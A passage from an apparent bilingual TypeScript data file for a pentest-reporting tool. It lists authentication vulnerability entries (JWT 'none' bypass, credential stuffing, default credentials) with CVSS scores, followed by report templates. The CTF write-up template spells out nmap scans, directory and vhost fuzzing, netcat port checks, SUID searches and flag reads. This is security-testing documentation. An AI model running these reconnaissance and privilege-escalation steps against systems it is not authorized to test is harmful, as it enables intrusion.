        overview_es: "### Resumen\nLa aplicación no impone reglas estrictas de complejidad de contraseñas, lo que permite a los usuarios elegir contraseñas simples y fáciles de adivinar. Esto aumenta el riesgo de ataques de fuerza bruta o de relleno de credenciales.",
        cwe: "CWE-521",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-002",
        title_en: "Brute-Force / Credential Stuffing",
        title_es: "Fuerza Bruta / Relleno de Credenciales",
        overview_en: "### Overview\nThe login endpoint is vulnerable to automated attacks that try a large number of passwords (brute-force) or use lists of leaked credentials (credential stuffing). This is often due to a lack of account lockout or rate-limiting mechanisms.",
        overview_es: "### Resumen\nEl punto de acceso de inicio de sesión es vulnerable a ataques automatizados que prueban una gran cantidad de contraseñas (fuerza bruta) o utilizan listas de credenciales filtradas (relleno de credenciales). Esto se debe a menudo a la falta de mecanismos de bloqueo de cuentas o de limitación de velocidad.",
        cwe: "CWE-307",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/Credential_stuffing"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-003",
        title_en: "Session Fixation",
        title_es: "Fijación de Sesión",
        overview_en: "### Overview\nSession fixation is an attack that permits an attacker to hijack a valid user session. The attack explores a limitation in the way the web application manages the session ID, more specifically the session ID renewal.",
        overview_es: "### Resumen\nLa fijación de sesión es un ataque que permite a un atacante secuestrar una sesión de usuario válida. El ataque explora una limitación en la forma en que la aplicación web gestiona el ID de sesión, más específicamente la renovación del ID de sesión.",
        cwe: "CWE-384",
        severity: "Medium",
        cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "L", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/Session_fixation"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-004",
        title_en: "Insufficient Multi-Factor Authentication (MFA)",
        title_es: "Autenticación Multifactor Insuficiente (MFA)",
        overview_en: "### Overview\nThe application either does not offer Multi-Factor Authentication or implements it in a way that can be easily bypassed. This weakens the overall authentication security.",
        overview_es: "### Resumen\nLa aplicación no ofrece Autenticación Multifactor o la implementa de una manera que puede ser fácilmente eludida. Esto debilita la seguridad general de la autenticación.",
        cwe: "CWE-308",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-005",
        title_en: "Use of Default Credentials",
        title_es: "Uso de Credenciales Predeterminadas",
        overview_en: "### Overview\nAn application or device is left with default, publicly known credentials (e.g., admin/admin). This provides a trivial entry point for attackers.",
        overview_es: "### Resumen\nUna aplicación o dispositivo se deja con credenciales predeterminadas y conocidas públicamente (p. ej., admin/admin). Esto proporciona un punto de entrada trivial para los atacantes.",
        cwe: "CWE-1392",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://cwe.mitre.org/data/definitions/1392.html"],
        tags: ["Authentication", "Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-006",
        title_en: "JWT Signature Bypass / Manipulation",
        title_es: "Omisión / Manipulación de Firma JWT",
        overview_en: "### Overview\nVulnerabilities in the handling of JSON Web Tokens (JWTs) allow an attacker to bypass signature validation. This can be done by changing the algorithm to 'none' or by using a weak secret key to forge a valid signature.",
        overview_es: "### Resumen\nLas vulnerabilidades en el manejo de JSON Web Tokens (JWT) permiten a un atacante eludir la validación de la firma. Esto se puede hacer cambiando el algoritmo a 'none' o usando una clave secreta débil para forjar una firma válida.",
        cwe: "CWE-347",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://jwt.io/introduction/"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-007",
        title_en: "Insecure Password Recovery",
        title_es: "Recuperación de Contraseña Insegura",
        overview_en: "### Overview\nThe password recovery mechanism is flawed, allowing an attacker to reset or retrieve another user's password. This could be due to predictable reset tokens, leaking tokens, or basing recovery on insecure questions.",
        overview_es: "### Resumen\nEl mecanismo de recuperación de contraseñas es defectuoso, lo que permite a un atacante restablecer o recuperar la contraseña de otro usuario. Esto podría deberse a tokens de reinicio predecibles, fuga de tokens o basar la recuperación en preguntas inseguras.",
        cwe: "CWE-640",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-008",
        title_en: "User / Password Enumeration",
        title_es: "Enumeración de Usuarios / Contraseñas",
        overview_en: "### Overview\nThe application provides different responses for valid and invalid usernames or passwords, allowing an attacker to determine which usernames are valid on the system. This information can then be used in further attacks.",
        overview_es: "### Resumen\nLa aplicación proporciona diferentes respuestas para nombres de usuario o contraseñas válidos e inválidos, lo que permite a un atacante determinar qué nombres de usuario son válidos en el sistema. Esta información puede luego ser utilizada en ataques posteriores.",
        cwe: "CWE-203",
        severity: "Low",
        cvss: { score: 3.7, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/Credential_stuffing"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    }
];


export const projectTemplates: ProjectTemplate[] = [
  {
    id: 'ptpl-1',
    name_en: 'Standard Web App Pentest',
    name_es: 'Pentest Estándar de Aplicación Web',
    description_en: 'A comprehensive security assessment for web applications, covering OWASP Top 10 and other common vulnerabilities.',
    description_es: 'Una evaluación de seguridad completa para aplicaciones web, cubriendo el OWASP Top 10 y otras vulnerabilidades comunes.',
    icon: 'Scan',
    scope_en: `## Executive Summary
This report outlines the results of an external penetration test performed on the internet-facing assets of **[TODO: Client Name]**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter. The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

---
## Attack Narrative
[TODO: Provide a high-level summary of the attack path and key findings.]

---
## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|:---|---|:---|
| <span style="color:red">Critical</span> | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise. |
| <span style="color:orange">High</span> | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access. |
| <span style="color:yellow">Medium</span> | 4.0 - 6.9 | Weaknesses that could reveal sensitive information. |
| <span style="color:blue">Low</span> | 0.1 - 3.9 | Minor issues that reduce the overall security posture. |
| <span style="color:gray">Informational</span> | 0.0 | Observations about the external footprint. |
`,
    appendix_en: `---
## Appendix
A combination of automated tools and manual techniques were used to perform this assessment.
- **Proxy:** Burp Suite Professional
- **Scanners:** Nessus, Nuclei
- **Reconnaissance:** Amass, Subfinder`,
    scope_es: `## Resumen Ejecutivo
Este informe describe los resultados de una prueba de penetración externa realizada en los activos de **[TODO: Nombre del Cliente]** expuestos a Internet. La evaluación tuvo como objetivo identificar vulnerabilidades que un atacante remoto podría explotar para comprometer la seguridad del perímetro de la organización. La evaluación se realizó entre el **[TODO: Fecha de Inicio]** y el **[TODO: Fecha de Fin]** desde la perspectiva de un atacante externo no autenticado (caja negra).

---
## Narrativa del Ataque
[TODO: Proporcionar un resumen de alto nivel de la ruta de ataque y los hallazgos clave.]

---
## Clasificación de Hallazgos

| Severidad | Puntuación CVSS v3.1 | Descripción |
|:---|---|:---|
| <span style="color:red">Crítica</span> | 9.0 - 10.0 | Vulnerabilidades que podrían llevar a un compromiso inmediato del sistema. |
| <span style="color:orange">Alta</span> | 7.0 - 8.9 | Vulnerabilidades que podrían permitir a un atacante obtener acceso no autorizado. |
| <span style="color:yellow">Media</span> | 4.0 - 6.9 | Debilidades que podrían revelar información sensible. |
| <span style="color:blue">Baja</span> | 0.1 - 3.9 | Problemas menores que reducen la postura de seguridad general. |
| <span style="color:gray">Informativa</span> | 0.0 | Observaciones sobre la huella externa. |`,
    appendix_es: `---
## Apéndice
Se utilizó una combinación de herramientas automatizadas y técnicas manuales para realizar esta evaluación.
- **Proxy:** Burp Suite Professional
- **Escáneres:** Nessus, Nuclei
- **Reconocimiento:** Amass, Subfinder`
  },
  {
    id: 'ptpl-2',
    name_en: 'Internal Network Assessment',
    name_es: 'Evaluación de Red Interna',
    description_en: 'An assessment of the internal network to identify misconfigurations, vulnerable services, and pathways for lateral movement.',
    description_es: 'Una evaluación de la red interna para identificar configuraciones incorrectas, servicios vulnerables y vías para el movimiento lateral.',
    icon: 'Network',
    scope_en: `## Scope
- **IP Ranges:** [TODO: Add IP ranges, e.g., 192.168.1.0/24]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Assumptions:** The assessment is performed from the perspective of an attacker who has gained a foothold on the internal network (e.g., a compromised workstation).
- **Exclusions:** [TODO: Specify any out-of-scope systems]`,
    appendix_en: `---
## Appendix
- **Network Scanner:** Nmap, Masscan
- **Vulnerability Scanner:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Manual Exploitation:** Metasploit Framework, CrackMapExec`,
    scope_es: `## Alcance
- **Rangos IP:** [TODO: Añadir rangos IP, p.ej., 192.168.1.0/24]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Supuestos:** La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
- **Exclusiones:** [TODO: Especificar sistemas fuera de alcance]`,
    appendix_es: `---
## Apéndice
- **Escáner de Red:** Nmap, Masscan
- **Escáner de Vulnerabilidades:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Explotación Manual:** Metasploit Framework, CrackMapExec`
  },
  {
    id: 'ptpl-3',
    name_en: 'Mobile App Pentest (iOS/Android)',
    name_es: 'Pentest de Aplicación Móvil (iOS/Android)',
    description_en: 'A security assessment of an iOS or Android mobile application, focusing on client-side vulnerabilities and backend API security.',
    description_es: 'Una evaluación de seguridad de una aplicación móvil de iOS o Android, centrada en vulnerabilidades del lado del cliente y seguridad de la API de backend.',
    icon: 'Smartphone',
    scope_en: `## Scope
- **Application:** [TODO: Add application name and package/bundle ID]
- **Platform:** iOS / Android
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Backend APIs:** [TODO: List backend API endpoints in scope]`,
    appendix_en: `---
## Appendix
- **Static Analysis:** MobSF, jadx
- **Dynamic Analysis:** Burp Suite, Frida, Objection
- **Test Devices:** Google Pixel 6 (Rooted), iPhone 12 (Jailbroken)`,
    scope_es: `## Alcance
- **Aplicación:** [TODO: Añadir nombre de la aplicación y ID del paquete/bundle]
- **Plataforma:** iOS / Android
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **APIs de Backend:** [TODO: Listar endpoints de API de backend en el alcance]`,
    appendix_es: `---
## Apéndice
- **Análisis Estático:** MobSF, jadx
- **Análisis Dinámico:** Burp Suite, Frida, Objection
- **Dispositivos de Prueba:** Google Pixel 6 (Rooteado), iPhone 12 (con Jailbreak)`
  },
  {
    id: 'ptpl-4',
    name_en: 'Certification Report',
    name_es: 'Informe de Certificación',
    description_en: 'A generic and professional template for offensive security certification reports (e.g., OSCP, CPTS). Includes all necessary sections for a complete report.',
    description_es: 'Una plantilla genérica y profesional para informes de certificaciones de seguridad ofensiva (p. ej., OSCP, CPTS). Incluye todas las secciones necesarias para un informe completo.',
    icon: 'Award',
    scope_en: `## Introduction
This report documents the results of the simulated penetration test performed in the [TODO: Certification Name] exam environment.

## Objective
The objective was to perform a penetration test, identifying and exploiting vulnerabilities to gain unauthorized access to target systems and achieve the exam objectives.

## Scope
- **Target Network:** [TODO: e.g., 10.10.10.0/24]
- **Exam Duration:** [TODO Start Date] to [TODO End Date]`,
    appendix_en: `---
## Appendix
| Hostname / IP | Location | Value |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: e.g., /root/proof.txt] | [TODO: Flag Value] |
`,
    scope_es: `## Introducción
Este informe documenta los resultados de la prueba de penetración simulada realizada en el entorno del examen [TODO: Nombre de la Certificación].

## Objetivo
El objetivo fue realizar una prueba de penetración, identificando y explotando vulnerabilidades para obtener acceso no autorizado a los sistemas objetivo y cumplir los objetivos del examen.

## Alcance
- **Red Objetivo:** [TODO: p. ej., 10.10.10.0/24]
- **Duración del Examen:** [TODO Start Date] a [TODO End Date]`,
    appendix_es: `---
## Apéndice
| Hostname / IP | Ubicación | Valor |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: p. ej., /root/proof.txt] | [TODO: Valor de la Bandera] |
`
  },
  {
    id: 'ptpl-5',
    name_en: 'Machine Writeup',
    name_es: 'Writeup de Máquina',
    description_en: 'A template for documenting the process of solving a CTF machine, such as those on Hack The Box.',
    description_es: 'Una plantilla para documentar el proceso de resolución de una máquina CTF, como las de Hack The Box.',
    icon: 'FileText',
    scope_en: `## General Information
- **Machine Name:** [TODO: Machine Name]
- **IP Address:** [TODO: IP Address]
- **Operating System:** Linux
- **Difficulty:** [TODO: Select Difficulty]
- **Date:** ${format(new Date(), 'dd-MM-yyyy')}

---
## Initial Reconnaissance

### Add IP to /etc/hosts
\`\`\`bash
echo "[TODO: IP Address] [TODO: machine.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Port Scanning (Nmap)

#### Simple Scan
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: IP Address]
\`\`\`

#### Advanced Scan
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: IP Address] -oN targeted
\`\`\`
*Result: Found ports 22 (SSH) and 80 (HTTP) open.*

---
## Web Enumeration

### Initial Access & Analysis
- **URL:** \`http://[TODO: machine.htb]\`
- **Useful Commands:**
  \`\`\`bash
  # Check DNS
  host [TODO: machine.htb]
  dig [TODO: machine.htb]
  
  # Check headers
  curl -I http://[TODO: machine.htb]
  
  # Web technology identification
  whatweb -a3 -v http://[TODO: machine.htb]
  
  # Check common ports
  netcat -vz [TODO: machine.htb] 1-1000
  \`\`\`

### Directory Fuzzing
\`\`\`bash
# Using dirsearch
dirsearch -u http://[TODO: machine.htb] -x 403,404

# Using gobuster
gobuster dir -u http://[TODO: machine.htb] -w /usr/share/wordlists/dirb/common.txt

# Using ffuf
ffuf -u http://[TODO: machine.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Found directories: [TODO: List found directories like /about.php, /contact.php]*

### Subdomain Enumeration (VHosts)
Check for different response sizes to identify potential virtual hosts.
\`\`\`bash
# Fuzz for subdomains using ffuf and filter by response size
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: machine.htb]/ -H 'Host: FUZZ.[TODO: machine.htb]' -fs [TODO: base_response_size]
\`\`\`
*Found subdomain: [TODO: e.g., grafana.planning.htb]. Added to /etc/hosts.*

---
## Exploitation

### Vulnerability Research
*Identified Service/Version: [TODO: e.g., Grafana v11.0.0]*
- Searched for exploits on:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Selected Exploit:** [TODO: Describe the selected exploit and its reference URL]

### Exploit Execution
[TODO: Step-by-step description of how the exploit was executed to gain initial access.]

---
## Initial Access
- **User:** \`whoami\` -> [TODO: user]
- **Environment:** \`uname -a\`, \`id\`, \`sudo -l\`

### User Flag
- **Command:** \`cat /home/[TODO: user]/user.txt\`

---
## Privilege Escalation

### Enumeration
- **Check sudo permissions:** \`sudo -l\`
- **Find SUID/GUID files:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Check running services:** \`ss -tuln\`
- **Automated enumeration scripts:** \`linpeas.sh\`, \`pspy\`

### Applied Technique
[TODO: Describe the technique used: SUID binary, misconfigured cronjob, hardcoded credentials, etc.]

---
## 👑 Root Flag
- **Command:** \`cat /root/root.txt\`
`,
    appendix_en: `---
## Appendix
- **Network Scanner:** Nmap
- **Web Fuzzer:** ffuf, dirsearch
- **Exploitation:** [TODO: e.g., Metasploit, Python script]
- **Privilege Escalation:** linpeas.sh`,
    scope_es: `## Información General
- **Nombre de la máquina:** [TODO: Nombre de la máquina]
- **Dirección IP:** [TODO: Dirección IP]
- **Sistema Operativo:** Linux
- **Dificultad:** [TODO: Seleccionar Dificultad]
- **Fecha:** ${format(new Date(), 'dd-MM-yyyy')}

---
## Reconocimiento Inicial

### Añadir IP a /etc/hosts
\`\`\`bash
echo "[TODO: Dirección IP] [TODO: maquina.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Escaneo de Puertos (Nmap)

#### Escaneo Simple
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: Dirección IP]
\`\`\`

#### Escaneo Avanzado
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: Dirección IP] -oN targeted
\`\`\`
*Resultado: Se encontraron los puertos 22 (SSH) y 80 (HTTP) abiertos.*

---
## Enumeración Web

### Acceso y Análisis Inicial
- **URL:** \`http://[TODO: maquina.htb]\`
- **Comandos útiles:**
  \`\`\`bash
  # Comprobar DNS
  host [TODO: maquina.htb]
  dig [TODO: maquina.htb]
  
  # Comprobar cabeceras
  curl -I http://[TODO: maquina.htb]
  
  # Identificación de tecnología web
  whatweb -a3 -v http://[TODO: maquina.htb]
  
  # Comprobar puertos comunes
  netcat -vz [TODO: maquina.htb] 1-1000
  \`\`\`

### Fuzzing de Directorios
\`\`\`bash
# Usando dirsearch
dirsearch -u http://[TODO: maquina.htb] -x 403,404

# Usando gobuster
gobuster dir -u http://[TODO: maquina.htb] -w /usr/share/wordlists/dirb/common.txt

# Usando ffuf
ffuf -u http://[TODO: maquina.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Directorios encontrados: [TODO: Listar directorios como /about.php, /contact.php]*

### Enumeración de Subdominios (VHosts)
Comprobar diferentes tamaños de respuesta para identificar posibles hosts virtuales.
\`\`\`bash
# Fuzzing de subdominios con ffuf y filtrado por tamaño de respuesta
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: maquina.htb]/ -H 'Host: FUZZ.[TODO: maquina.htb]' -fs [TODO: tamaño_respuesta_base]
\`\`\`
*Subdominio encontrado: [TODO: p.ej., grafana.planning.htb]. Añadido a /etc/hosts.*

---
## Explotación

### Investigación de Vulnerabilidades
*Servicio/Versión Identificado: [TODO: p.ej., Grafana v11.0.0]*
- Búsqueda de exploits en:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Exploit Seleccionado:** [TODO: Describir el exploit usado y su URL de referencia]

### Ejecución del Exploit
[TODO: Descripción paso a paso de cómo se ejecutó el exploit para obtener acceso inicial.]

---
## Acceso Inicial
- **Usuario:** \`whoami\` -> [TODO: usuario]
- **Entorno:** \`uname -a\`, \`id\`, \`sudo -l\`

### Bandera de Usuario (User Flag)
- **Comando:** \`cat /home/[TODO: usuario]/user.txt\`

---
## Escalada de Privilegios

### Enumeración
- **Comprobar permisos de sudo:** \`sudo -l\`
- **Buscar archivos SUID/GUID:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Ver servicios en ejecución:** \`ss -tuln\`
- **Scripts de enumeración automatizada:** \`linpeas.sh\`, \`pspy\`

### Técnica Aplicada
[TODO: Describir la técnica usada: binario SUID, cronjob mal configurado, credenciales hardcoded, etc.]

---
## 👑 Root Flag
- **Comando:** \`cat /root/root.txt\`
`,
    appendix_es: `---
## Apéndice
- **Escáner de Red:** Nmap
- **Fuzzer Web:** ffuf, dirsearch
- **Explotación:** [TODO: p. ej., Metasploit, script de Python]
- **Escalada de Privilegios:** linpeas.sh`
  },
];
